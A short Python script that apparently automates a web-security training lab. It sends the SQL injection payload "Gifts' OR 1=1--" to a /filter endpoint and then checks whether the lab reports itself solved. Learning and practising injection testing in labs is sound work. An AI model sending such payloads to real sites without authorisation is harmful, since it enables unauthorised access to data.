import sys
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def run_sql_payload(url):

    print()
    print(f"[*] Sending request as GET {url}/filter")
    print()

    url = url + "/filter"

    data = {
         "category": "Gifts' OR 1=1--"
    }

    response = requests.get(url=url,params=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        run_sql_payload(url)
        verify_if_lab_solved(url)
